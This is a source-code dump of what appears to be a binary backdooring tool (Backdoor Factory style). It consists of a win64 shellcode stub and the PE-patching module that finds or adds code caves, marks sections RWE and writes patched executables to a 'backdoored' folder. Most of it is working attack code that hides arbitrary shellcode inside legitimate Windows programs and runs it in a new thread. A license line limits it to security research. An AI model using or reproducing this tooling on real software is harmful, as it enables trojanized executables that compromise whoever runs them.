                            "\x49\xc7\xc6"                      #mov r14, 1abh size of payload...   
                            )
        self.shellcode1 += struct.pack("<H", len(self.supplied_shellcode))
        self.shellcode1 += ("\x00\x00"
                            "\x6a\x40"                          #push 40h
                            "\x41\x59"                          #pop r9 now 40h
                            "\x68\x00\x10\x00\x00"              #push 1000h
                            "\x41\x58"                          #pop r8.. now 1000h
                            "\x4C\x89\xF2"                      #mov rdx, r14
                            "\x6A\x00"                          # push 0
                            "\x59"                              # pop rcx
                            "\x68\x58\xa4\x53\xe5"              #push E553a458
                            "\x41\x5A"                          #pop r10
                            "\xff\xd5"                          #call rbp
                            "\x48\x89\xc3"                      #mov rbx, rax      ; Store allocated address in ebx
                            "\x48\x89\xc7"                      #mov rdi, rax      ; Prepare EDI with the new address
                            )
                            ##mov rcx, 0x1ab
        self.shellcode1 += "\x48\xc7\xc1"
        self.shellcode1 += struct.pack("<H", len(self.supplied_shellcode))
        self.shellcode1 += "\x00\x00"
                            
        #call the get_payload right before the payload
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int('0xffffffff', 16) + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3)
        else:
            self.shellcode1 += "\xeb\x43" 

                            # got_payload:
        self.shellcode1 += ( "\x5e"                                 #pop rsi            ; Prepare ESI with the source to copy               
                            "\xf2\xa4"                              #rep movsb          ; Copy the payload to RWX memory
                            "\xe8\x00\x00\x00\x00"                  #call set_handler   ; Configure error handling

                            #set_handler:
                            "\x48\x31\xC0" #  xor rax,rax
                            
                            "\x50"                                  #  push rax          ; LPDWORD lpThreadId (NULL)
                            "\x50"                                  #  push rax          ; DWORD dwCreationFlags (0)
                            "\x49\x89\xC1"                          # mov r9, rax        ; LPVOID lpParameter (NULL)
                            "\x48\x89\xC2"                          #mov rdx, rax        ; LPTHREAD_START_ROUTINE lpStartAddress (payload)
                            "\x49\x89\xD8"                          #mov r8, rbx         ; SIZE_T dwStackSize (0 for default)
                            "\x48\x89\xC1"                          #mov rcx, rax        ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)
                            "\x49\xC7\xC2\x38\x68\x0D\x16"          #mov r10, 0x160D6838  ; hash( "kernel32.dll", "CreateThread" )
                            "\xFF\xD5"                              #  call rbp               ; Spawn payload thread
                            "\x48\x83\xC4\x58"                      #add rsp, 50
                            
                            #stackrestore
                            "\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
                            "\x41\x58\x5d\x5f\x5e\x5a\x59\x5b\x58"
                            )
        
        
        breakupvar = eat_code_caves(flItms, 0, 2)
        
        #Jump to the win64 return to normal execution code segment.
        if flItms['cave_jumping'] is True:
            self.shellcode1 += "\xe9"
            if breakupvar > 0:
                if len(self.shellcode1) < breakupvar:
                    self.shellcode1 += struct.pack("<I", int(str(hex(breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 4).rstrip('L')), 16))
                else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(len(self.shellcode1) -
                                                   breakupvar - len(self.stackpreserve) - 4).rstrip('L')), 16))
            else:
                    self.shellcode1 += struct.pack("<I", int(str(hex(0xffffffff + breakupvar - len(self.stackpreserve) -
                                                   len(self.shellcode1) - 3).rstrip('L')), 16))

        breakupvar = eat_code_caves(flItms, 0, 1)
        
        #get_payload:  #Jump back with the address for the payload on the stack.
        if flItms['cave_jumping'] is True:
            self.shellcode2 = "\xe8"
            if breakupvar > 0:
                if len(self.shellcode2) < breakupvar:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - breakupvar -
                                                   len(self.shellcode2) + 272).rstrip('L')), 16))
                else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(0xffffffff - len(self.shellcode2) -
                                                   breakupvar + 272).rstrip('L')), 16))
            else:
                    self.shellcode2 += struct.pack("<I", int(str(hex(abs(breakupvar) + len(self.stackpreserve) +
                                                             len(self.shellcode2) + 244).rstrip('L')), 16))
        else:
            self.shellcode2 = "\xE8\xB8\xFF\xFF\xFF"
        
        #Can inject any shellcode below.

        self.shellcode2 += self.supplied_shellcode
        self.shellcode1 += "\xe9"
        self.shellcode1 += struct.pack("<I", len(self.shellcode2))

        self.shellcode = self.stackpreserve + self.shellcode1 + self.shellcode2
        return (self.stackpreserve + self.shellcode1, self.shellcode2)


##########################################################
#                 END win64 shellcodes                   #
##########################################################
########NEW FILE########
__FILENAME__ = pebin
'''
    Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
    
    Copyright (C) 2013,2014, Joshua Pitts

    License:   GPLv3

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    See <http://www.gnu.org/licenses/> for a copy of the GNU General
    Public License

    Currently supports win32/64 PE and linux32/64 ELF only(intel architecture).
    This program is to be used for only legal activities by IT security
    professionals and researchers. Author not responsible for malicious
    uses.
'''

import sys
import os
import struct
import shutil
import random
import signal
import platform
import stat
import time
import subprocess
from random import choice
from binascii import unhexlify
from optparse import OptionParser
from intel.intelCore import intelCore
from intel.intelmodules import eat_code_caves
from intel.WinIntelPE32 import winI32_shellcode
from intel.WinIntelPE64 import winI64_shellcode


MachineTypes = {'0x0': 'AnyMachineType',
                    '0x1d3': 'Matsushita AM33',
                    '0x8664': 'x64',
                    '0x1c0': 'ARM LE',
                    '0x1c4': 'ARMv7',
                    '0xaa64': 'ARMv8 x64',
                    '0xebc': 'EFIByteCode',
                    '0x14c': 'Intel x86',
                    '0x200': 'Intel Itanium',
                    '0x9041': 'M32R',
                    '0x266': 'MIPS16',
                    '0x366': 'MIPS w/FPU',
                    '0x466': 'MIPS16 w/FPU',
                    '0x1f0': 'PowerPC LE',
                    '0x1f1': 'PowerPC w/FP',
                    '0x166': 'MIPS LE',
                    '0x1a2': 'Hitachi SH3',
                    '0x1a3': 'Hitachi SH3 DSP',
                    '0x1a6': 'Hitachi SH4',
                    '0x1a8': 'Hitachi SH5',
                    '0x1c2': 'ARM or Thumb -interworking',
                    '0x169': 'MIPS little-endian WCE v2'
                    }

#What is supported:
supported_types = ['Intel x86', 'x64']

class pebin():
    
    def __init__(self, FILE, OUTPUT, SHELL, NSECTION='sdata', DISK_OFFSET=0, ADD_SECTION=False,
                CAVE_JUMPING=False, PORT=8888, HOST="127.0.0.1", SUPPLIED_SHELLCODE=None, 
                INJECTOR = False, CHANGE_ACCESS = True, VERBOSE=False, SUPPORT_CHECK=False, 
                SHELL_LEN=300, FIND_CAVES=False, SUFFIX=".old", DELETE_ORIGINAL=False):
        self.FILE = FILE
        self.OUTPUT = OUTPUT;
        self.SHELL = SHELL
        self.NSECTION = NSECTION
        self.DISK_OFFSET = DISK_OFFSET
        self.ADD_SECTION = ADD_SECTION
        self.CAVE_JUMPING = CAVE_JUMPING
        self.PORT = PORT
        self.HOST = HOST
        self.SUPPLIED_SHELLCODE = SUPPLIED_SHELLCODE
        self.flItms = {}
        self.INJECTOR = INJECTOR
        self.CHANGE_ACCESS = CHANGE_ACCESS
        self.VERBOSE = VERBOSE
        self.SUPPORT_CHECK = SUPPORT_CHECK
        self.SHELL_LEN = SHELL_LEN
        self.FIND_CAVES = FIND_CAVES
        self.SUFFIX = SUFFIX
        self.DELETE_ORIGINAL = DELETE_ORIGINAL
       

    def run_this(self):
        if self.INJECTOR is True:
            self.injector()
            sys.exit()
        if self.FIND_CAVES is True:
            issupported = self.support_check()
            if issupported is False:
                print self.FILE, "is not supported."
                sys.exit()
            print ("Looking for caves with a size of %s "
               "bytes (measured as an integer)"
               % self.SHELL_LEN)
            self.find_all_caves()
            sys.exit()
        if self.SUPPORT_CHECK is True:
            if not self.FILE:
                print "You must provide a file to see if it is supported (-f)"
                sys.exit()
            try:
                is_supported = self.support_check()
            except Exception, e:
                is_supported = False
                print 'Exception:', str(e), '%s' % self.FILE
            if is_supported is False:
                print "%s is not supported." % self.FILE
            else:
                print "%s is supported." % self.FILE
                if self.flItms['runas_admin'] is True:
                        print "%s must be run as admin." % self.FILE
            sys.exit()
        self.output_options()
        return self.patch_pe()


    def gather_file_info_win(self):
        """
        Gathers necessary PE header information to backdoor
        a file and returns a dict of file information called flItms
        """
        #To do:
        #   verify signed vs unsigned
        #   map all headers
        #   map offset once the magic field is determined of 32+/32

        self.binary.seek(int('3C', 16))
        print "[*] Gathering file info"
        self.flItms['filename'] = self.FILE
        self.flItms['buffer'] = 0
        self.flItms['JMPtoCodeAddress'] = 0
        self.flItms['LocOfEntryinCode_Offset'] = self.DISK_OFFSET
        #---!!!! This will need to change for x64 !!!!
        #not so sure now..
        self.flItms['dis_frm_pehdrs_sectble'] = 248
        self.flItms['pe_header_location'] = struct.unpack('<i', self.binary.read(4))[0]
        # Start of COFF
        self.flItms['COFF_Start'] = self.flItms['pe_header_location'] + 4
        self.binary.seek(self.flItms['COFF_Start'])
        self.flItms['MachineType'] = struct.unpack('<H', self.binary.read(2))[0]
        for mactype, name in MachineTypes.iteritems():
            if int(mactype, 16) == self.flItms['MachineType']:
                if self.VERBOSE is True:
                    print 'MachineType is:', name
        #self.binary.seek(self.flItms['ImportTableLocation'])
        #self.flItms['IATLocInCode'] = struct.unpack('<I', self.binary.read(4))[0]
        self.binary.seek(self.flItms['COFF_Start'] + 2, 0)
        self.flItms['NumberOfSections'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['TimeDateStamp'] = struct.unpack('<I', self.binary.read(4))[0]
        self.binary.seek(self.flItms['COFF_Start'] + 16, 0)
        self.flItms['SizeOfOptionalHeader'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['Characteristics'] = struct.unpack('<H', self.binary.read(2))[0]
        #End of COFF
        self.flItms['OptionalHeader_start'] = self.flItms['COFF_Start'] + 20
        
        #if self.flItms['SizeOfOptionalHeader']:
            #Begin Standard Fields section of Optional Header
        self.binary.seek(self.flItms['OptionalHeader_start'])
        self.flItms['Magic'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['MajorLinkerVersion'] = struct.unpack("!B", self.binary.read(1))[0]
        self.flItms['MinorLinkerVersion'] = struct.unpack("!B", self.binary.read(1))[0]
        self.flItms['SizeOfCode'] = struct.unpack("<I", self.binary.read(4))[0]
        self.flItms['SizeOfInitializedData'] = struct.unpack("<I", self.binary.read(4))[0]
        self.flItms['SizeOfUninitializedData'] = struct.unpack("<i",
                                                          self.binary.read(4))[0]
        self.flItms['AddressOfEntryPoint'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['BaseOfCode'] = struct.unpack('<i', self.binary.read(4))[0]
        #print 'Magic', self.flItms['Magic']
        if self.flItms['Magic'] != int('20B', 16):
            #print 'Not 0x20B!'
            self.flItms['BaseOfData'] = struct.unpack('<i', self.binary.read(4))[0]
        # End Standard Fields section of Optional Header
        # Begin Windows-Specific Fields of Optional Header
        if self.flItms['Magic'] == int('20B', 16):
            #print 'x64!'
            self.flItms['ImageBase'] = struct.unpack('<Q', self.binary.read(8))[0]
        else:
            self.flItms['ImageBase'] = struct.unpack('<I', self.binary.read(4))[0]
        #print 'self.flItms[ImageBase]', hex(self.flItms['ImageBase'])
        self.flItms['SectionAlignment'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['FileAlignment'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['MajorOperatingSystemVersion'] = struct.unpack('<H',
                                                              self.binary.read(2))[0]
        self.flItms['MinorOperatingSystemVersion'] = struct.unpack('<H',
                                                              self.binary.read(2))[0]
        self.flItms['MajorImageVersion'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['MinorImageVersion'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['MajorSubsystemVersion'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['MinorSubsystemVersion'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['Win32VersionValue'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['SizeOfImageLoc'] = self.binary.tell()
        self.flItms['SizeOfImage'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['SizeOfHeaders'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['CheckSum'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['Subsystem'] = struct.unpack('<H', self.binary.read(2))[0]
        self.flItms['DllCharacteristics'] = struct.unpack('<H', self.binary.read(2))[0]
        if self.flItms['Magic'] == int('20B', 16):
            self.flItms['SizeOfStackReserve'] = struct.unpack('<Q', self.binary.read(8))[0]
            self.flItms['SizeOfStackCommit'] = struct.unpack('<Q', self.binary.read(8))[0]
            self.flItms['SizeOfHeapReserve'] = struct.unpack('<Q', self.binary.read(8))[0]
            self.flItms['SizeOfHeapCommit'] = struct.unpack('<Q', self.binary.read(8))[0]

        else:
            self.flItms['SizeOfStackReserve'] = struct.unpack('<I', self.binary.read(4))[0]
            self.flItms['SizeOfStackCommit'] = struct.unpack('<I', self.binary.read(4))[0]
            self.flItms['SizeOfHeapReserve'] = struct.unpack('<I', self.binary.read(4))[0]
            self.flItms['SizeOfHeapCommit'] = struct.unpack('<I', self.binary.read(4))[0]
        self.flItms['LoaderFlags'] = struct.unpack('<I', self.binary.read(4))[0]  # zero
        self.flItms['NumberofRvaAndSizes'] = struct.unpack('<I', self.binary.read(4))[0]
        # End Windows-Specific Fields of Optional Header
        # Begin Data Directories of Optional Header
        self.flItms['ExportTable'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['ImportTable'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['ResourceTable'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['ExceptionTable'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['CertificateTable'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['BaseReLocationTable'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['Debug'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['Architecutre'] = struct.unpack('<Q', self.binary.read(8))[0]  # zero
        self.flItms['GlobalPrt'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['TLS Table'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['LoadConfigTable'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['ImportTableLocation'] = self.binary.tell()
        #print 'ImportTableLocation', hex(self.flItms['ImportTableLocation'])
        self.flItms['BoundImport'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.binary.seek(self.flItms['ImportTableLocation'])
        self.flItms['IATLocInCode'] = struct.unpack('<I', self.binary.read(4))[0]
        #print 'first IATLOCIN CODE', hex(self.flItms['IATLocInCode'])
        self.flItms['IATSize'] = struct.unpack('<I', self.binary.read(4))[0]
        #print 'IATSize', hex(self.flItms['IATSize'])
        self.flItms['IAT'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['DelayImportDesc'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['CLRRuntimeHeader'] = struct.unpack('<Q', self.binary.read(8))[0]
        self.flItms['Reserved'] = struct.unpack('<Q', self.binary.read(8))[0]  # zero
        self.flItms['BeginSections'] = self.binary.tell()
        
        if self.flItms['NumberOfSections'] is not 0:
            self.flItms['Sections'] = []
            for section in range(self.flItms['NumberOfSections']):
                sectionValues = []
                sectionValues.append(self.binary.read(8))
                # VirtualSize
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                # VirtualAddress
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                # SizeOfRawData
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                # PointerToRawData
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                # PointerToRelocations
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                # PointerToLinenumbers
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                # NumberOfRelocations
                sectionValues.append(struct.unpack('<H', self.binary.read(2))[0])
                # NumberOfLinenumbers
                sectionValues.append(struct.unpack('<H', self.binary.read(2))[0])
                # SectionFlags
                sectionValues.append(struct.unpack('<I', self.binary.read(4))[0])
                self.flItms['Sections'].append(sectionValues)
                if 'UPX'.lower() in sectionValues[0].lower():
                    print "UPX files not supported."
                    return False
                if ('.text\x00\x00\x00' == sectionValues[0] or
                   'AUTO\x00\x00\x00\x00' == sectionValues[0] or
                   'CODE\x00\x00\x00\x00' == sectionValues[0]):
                    self.flItms['textSectionName'] = sectionValues[0]
                    self.flItms['textVirtualAddress'] = sectionValues[2]
                    self.flItms['textPointerToRawData'] = sectionValues[4]
                elif '.rsrc\x00\x00\x00' == sectionValues[0]:
                    self.flItms['rsrcSectionName'] = sectionValues[0]
                    self.flItms['rsrcVirtualAddress'] = sectionValues[2]
                    self.flItms['rsrcSizeRawData'] = sectionValues[3]
                    self.flItms['rsrcPointerToRawData'] = sectionValues[4]
            self.flItms['VirtualAddress'] = self.flItms['SizeOfImage']
            
            self.flItms['LocOfEntryinCode'] = (self.flItms['AddressOfEntryPoint'] -
                                          self.flItms['textVirtualAddress'] +
                                          self.flItms['textPointerToRawData'] +
                                          self.flItms['LocOfEntryinCode_Offset'])

            
        else:
             self.flItms['LocOfEntryinCode'] = (self.flItms['AddressOfEntryPoint'] -
                                          self.flItms['LocOfEntryinCode_Offset'])

        self.flItms['VrtStrtngPnt'] = (self.flItms['AddressOfEntryPoint'] +
                                      self.flItms['ImageBase'])
        self.binary.seek(self.flItms['IATLocInCode'])
        self.flItms['ImportTableALL'] = self.binary.read(self.flItms['IATSize'])
        self.flItms['NewIATLoc'] = self.flItms['IATLocInCode'] + 40
        #return self.flItms

    
    def print_flItms(self, flItms):

        keys = self.flItms.keys()
        keys.sort()
        for item in keys:
            if type(self.flItms[item]) == int:
                print item + ':', hex(self.flItms[item])
            elif item == 'Sections':
                print "-" * 50
                for section in self.flItms['Sections']:
                    print "Section Name", section[0]
                    print "Virutal Size", hex(section[1])
                    print "Virtual Address", hex(section[2])
                    print "SizeOfRawData", hex(section[3])
                    print "PointerToRawData", hex(section[4])
                    print "PointerToRelocations", hex(section[5])
                    print "PointerToLinenumbers", hex(section[6])
                    print "NumberOfRelocations", hex(section[7])
                    print "NumberOfLinenumbers", hex(section[8])
                    print "SectionFlags", hex(section[9])
                    print "-" * 50
            else:
                print item + ':', self.flItms[item]
        print "*" * 50, "END flItms"


    def change_section_flags(self, section):
        """
        Changes the user selected section to RWE for successful execution
        """
        print "[*] Changing Section Flags"
        self.flItms['newSectionFlags'] = int('e00000e0', 16)
        self.binary.seek(self.flItms['BeginSections'], 0)
        for _ in range(self.flItms['NumberOfSections']):
            sec_name = self.binary.read(8)
            if section in sec_name:
                self.binary.seek(28, 1)
                self.binary.write(struct.pack('<I', self.flItms['newSectionFlags']))
                return
            else:
                self.binary.seek(32, 1)


    def create_code_cave(self):
        """
        This function creates a code cave for shellcode to hide,
        takes in the dict from gather_file_info_win function and
        writes to the file and returns flItms
        """
        print "[*] Creating Code Cave"
        self.flItms['NewSectionSize'] = len(self.flItms['shellcode']) + 250  # bytes
        self.flItms['SectionName'] = self.NSECTION  # less than 7 chars
        self.flItms['filesize'] = os.stat(self.flItms['filename']).st_size
        self.flItms['newSectionPointerToRawData'] = self.flItms['filesize']
        self.flItms['VirtualSize'] = int(str(self.flItms['NewSectionSize']), 16)
        self.flItms['SizeOfRawData'] = self.flItms['VirtualSize']
        self.flItms['NewSectionName'] = "." + self.flItms['SectionName']
        self.flItms['newSectionFlags'] = int('e00000e0', 16)
        self.binary.seek(self.flItms['pe_header_location'] + 6, 0)
        self.binary.write(struct.pack('<h', self.flItms['NumberOfSections'] + 1))
        self.binary.seek(self.flItms['SizeOfImageLoc'], 0)
        self.flItms['NewSizeOfImage'] = (self.flItms['VirtualSize'] +
                                    self.flItms['SizeOfImage'])
        self.binary.write(struct.pack('<I', self.flItms['NewSizeOfImage']))
        self.binary.seek(self.flItms['ImportTableLocation'])
        if self.flItms['IATLocInCode'] != 0:
            self.binary.write(struct.pack('=i', self.flItms['IATLocInCode'] + 40))
        self.binary.seek(self.flItms['BeginSections'] +
               40 * self.flItms['NumberOfSections'], 0)
        self.binary.write(self.flItms['NewSectionName'] +
                "\x00" * (8 - len(self.flItms['NewSectionName'])))
        self.binary.write(struct.pack('<I', self.flItms['VirtualSize']))
        self.binary.write(struct.pack('<I', self.flItms['SizeOfImage']))
        self.binary.write(struct.pack('<I', self.flItms['SizeOfRawData']))
        self.binary.write(struct.pack('<I', self.flItms['newSectionPointerToRawData']))
        if self.VERBOSE is True:
            print 'New Section PointerToRawData'
            print self.flItms['newSectionPointerToRawData']
        self.binary.write(struct.pack('<I', 0))
        self.binary.write(struct.pack('<I', 0))
        self.binary.write(struct.pack('<I', 0))
        self.binary.write(struct.pack('<I', self.flItms['newSectionFlags']))
        self.binary.write(self.flItms['ImportTableALL'])
        self.binary.seek(self.flItms['filesize'] + 1, 0)  # moving to end of file
        nop = choice(intelCore.nops)
        if nop > 144:
            self.binary.write(struct.pack('!H', nop) * (self.flItms['VirtualSize'] / 2))
        else:
            self.binary.write(struct.pack('!B', nop) * (self.flItms['VirtualSize']))
        self.flItms['CodeCaveVirtualAddress'] = (self.flItms['SizeOfImage'] +
                                            self.flItms['ImageBase'])
        self.flItms['buffer'] = int('200', 16)  # bytes
        self.flItms['JMPtoCodeAddress'] = (self.flItms['CodeCaveVirtualAddress'] -
                                      self.flItms['AddressOfEntryPoint'] -
                                      self.flItms['ImageBase'] - 5 +
                                      self.flItms['buffer'])
        

    def find_all_caves(self ):
        """
        This function finds all the codecaves in a inputed file.
        Prints results to screen
        """

        print "[*] Looking for caves"
        SIZE_CAVE_TO_FIND = self.SHELL_LEN
        BeginCave = 0
        Tracking = 0
        count = 1
        caveTracker = []
        caveSpecs = []
        self.binary = open(self.FILE, 'r+b')
        self.binary.seek(0)
        while True:
            try:
                s = struct.unpack("<b", self.binary.read(1))[0]
            except Exception as e:
                #print str(e)
                break
            if s == 0:
                if count == 1:
                    BeginCave = Tracking
                count += 1
            else:
                if count >= SIZE_CAVE_TO_FIND:
                    caveSpecs.append(BeginCave)
                    caveSpecs.append(Tracking)
                    caveTracker.append(caveSpecs)
                count = 1
                caveSpecs = []

            Tracking += 1

        for caves in caveTracker:

            countOfSections = 0
            for section in self.flItms['Sections']:
                sectionFound = False
                if caves[0] >= section[4] and caves[1] <= (section[3] + section[4]) and \
                    caves[1] - caves[0] >= SIZE_CAVE_TO_FIND:
                    print "We have a winner:", section[0]
                    print '->Begin Cave', hex(caves[0])
                    print '->End of Cave', hex(caves[1])
                    print 'Size of Cave (int)', caves[1] - caves[0]
                    print 'SizeOfRawData', hex(section[3])
                    print 'PointerToRawData', hex(section[4])
                    print 'End of Raw Data:', hex(section[3] + section[4])
                    print '*' * 50
                    sectionFound = True
                    break
            if sectionFound is False:
                try:
                    print "No section"
                    print '->Begin Cave', hex(caves[0])
                    print '->End of Cave', hex(caves[1])
                    print 'Size of Cave (int)', caves[1] - caves[0]
                    print '*' * 50
                except Exception as e:
                    print str(e)
        print "[*] Total of %s caves found" % len(caveTracker)
        self.binary.close()


    def find_cave(self):
        """This function finds all code caves, allowing the user
        to pick the cave for injecting shellcode."""
        
        len_allshells = ()
        if self.flItms['cave_jumping'] is True:
            for item in self.flItms['allshells']:
                len_allshells += (len(item), )
            len_allshells += (len(self.flItms['resumeExe']), )
            SIZE_CAVE_TO_FIND = sorted(len_allshells)[0]
        else:
            SIZE_CAVE_TO_FIND = self.flItms['shellcode_length']
            len_allshells = (self.flItms['shellcode_length'], )

        print "[*] Looking for caves that will fit the minimum "\
              "shellcode length of %s" % SIZE_CAVE_TO_FIND
        print "[*] All caves lengths: ", len_allshells
        Tracking = 0
        count = 1
        #BeginCave=0
        caveTracker = []
        caveSpecs = []

        self.binary.seek(0)

        while True:
            try:
                s = struct.unpack("<b", self.binary.read(1))[0]
            except Exception as e:
                #print "CODE CAVE", str(e)
                break
            if s == 0:
                if count == 1:
                    BeginCave = Tracking
                count += 1
            else:
                if count >= SIZE_CAVE_TO_FIND:
                    caveSpecs.append(BeginCave)
                    caveSpecs.append(Tracking)
                    caveTracker.append(caveSpecs)
                count = 1
                caveSpecs = []

            Tracking += 1

        pickACave = {}

        for i, caves in enumerate(caveTracker):
            i += 1
            countOfSections = 0
            for section in self.flItms['Sections']:
                sectionFound = False
                try:
                    if caves[0] >= section[4] and \
                       caves[1] <= (section[3] + section[4]) and \
                       caves[1] - caves[0] >= SIZE_CAVE_TO_FIND:
                        if self.VERBOSE is True:
                            print "Inserting code in this section:", section[0]
                            print '->Begin Cave', hex(caves[0])
                            print '->End of Cave', hex(caves[1])
                            print 'Size of Cave (int)', caves[1] - caves[0]
                            print 'SizeOfRawData', hex(section[3])
                            print 'PointerToRawData', hex(section[4])
                            print 'End of Raw Data:', hex(section[3] + section[4])
                            print '*' * 50
                        JMPtoCodeAddress = (section[2] + caves[0] - section[4] -
                                            5 - self.flItms['AddressOfEntryPoint'])

                        sectionFound = True
                        pickACave[i] = [section[0], hex(caves[0]), hex(caves[1]),
                                        caves[1] - caves[0], hex(section[4]),
                                        hex(section[3] + section[4]), JMPtoCodeAddress]
                        break
                except:
                    print "-End of File Found.."
                    break
                if sectionFound is False:
                    if self.VERBOSE is True:
                        print "No section"
                        print '->Begin Cave', hex(caves[0])
                        print '->End of Cave', hex(caves[1])
                        print 'Size of Cave (int)', caves[1] - caves[0]
                        print '*' * 50

                JMPtoCodeAddress = (section[2] + caves[0] - section[4] -
                                    5 - self.flItms['AddressOfEntryPoint'])
                try:
                    pickACave[i] = ["None", hex(caves[0]), hex(caves[1]),
                                    caves[1] - caves[0], "None",
                                    "None", JMPtoCodeAddress]
                except:
                    print "EOF"

        print ("############################################################\n"
               "The following caves can be used to inject code and possibly\n"
               "continue execution.\n"
               "**Don't like what you see? Use jump, single, or append.**\n"
               "############################################################")

        CavesPicked = {}

        for k, item in enumerate(len_allshells):
            print "[*] Cave {0} length as int: {1}".format(k + 1, item)
            print "[*] Available caves: "

            for ref, details in pickACave.iteritems():
                if details[3] >= item:
                    print str(ref) + ".", ("Section Name: {0}; Section Begin: {4} "
                                           "End: {5}; Cave begin: {1} End: {2}; "
                                           "Cave Size: {3}".format(details[0], details[1], details[2],
                                                                   details[3], details[4], details[5],
                                                                   details[6]))

            while True:
                print "*" * 50
                selection = raw_input("[!] Enter your selection: ")
                try:
                    selection = int(selection)
                    print "Using selection: %s" % selection
                    try:
                        if self.CHANGE_ACCESS is True:
                            if pickACave[selection][0] != "None":
                                self.change_section_flags(pickACave[selection][0])
                        CavesPicked[k] = pickACave[selection]
                        break
                    except Exception as e:
                        print str(e)
                        print "-User selection beyond the bounds of available caves...appending a code cave"
                        return None
                except Exception as e:
                    if selection.lower() == 'append' or selection.lower() == 'jump' or selection.lower() == 'single':
                        return selection
        return CavesPicked


    def runas_admin(self):
        """
        This module jumps to .rsrc section and checks for
        the following string: requestedExecutionLevel level="highestAvailable"

        """
        #g = open(flItms['filename'], "rb")
        runas_admin = False
        if 'rsrcPointerToRawData' in self.flItms:
            self.binary.seek(self.flItms['rsrcPointerToRawData'], 0)
            search_lngth = len('requestedExecutionLevel level="highestAvailable"')
            data_read = 0
            while data_read < self.flItms['rsrcSizeRawData']:
                self.binary.seek(self.flItms['rsrcPointerToRawData'] + data_read, 0)
                temp_data = self.binary.read(search_lngth)
                if temp_data == 'requestedExecutionLevel level="highestAvailable"':
                    runas_admin = True
                    break
                data_read += 1

        return runas_admin


    def support_check(self):
        """
        This function is for checking if the current exe/dll is
        supported by this program. Returns false if not supported,
        returns flItms if it is.
        """
        print "[*] Checking if binary is supported"
        self.flItms['supported'] = False
        #global f
        self.binary = open(self.FILE, "r+b")
        if self.binary.read(2) != "\x4d\x5a":
            print "%s not a PE File" % self.FILE
            return False
        self.gather_file_info_win()
        if self.flItms is False:
            return False
        if MachineTypes[hex(self.flItms['MachineType'])] not in supported_types:
            for item in self.flItms:
                print item + ':', self.flItms[item]
            print ("This program does not support this format: %s"
                   % MachineTypes[hex(self.flItms['MachineType'])])
        else:
            self.flItms['supported'] = True
        targetFile = intelCore(self.flItms, self.binary, self.VERBOSE)
        if self.flItms['Magic'] == int('20B', 16):
            self.flItms, self.flItms['count_bytes'] = targetFile.pe64_entry_instr()
        elif self.flItms['Magic'] == int('10b', 16):
            self.flItms, self.flItms['count_bytes'] = targetFile.pe32_entry_instr()
        else:
            self.flItms['supported'] = False
        self.flItms['runas_admin'] = self.runas_admin()

        if self.VERBOSE is True:
            self.print_flItms(self.flItms)

        if self.flItms['supported'] is False:
            return False
        self.binary.close()


    def patch_pe(self):

        """
        This function operates the sequence of all involved
        functions to perform the binary patching.
        """
        print "[*] In the backdoor module"
        if self.INJECTOR is False:
            os_name = os.name
            if not os.path.exists("backdoored"):
                os.makedirs("backdoored")
            if os_name == 'nt':
                self.OUTPUT = "backdoored\\" + self.OUTPUT
            else:
                self.OUTPUT = "backdoored/" + self.OUTPUT

        issupported = self.support_check()
        if issupported is False:
            return None
        self.flItms['NewCodeCave'] = self.ADD_SECTION
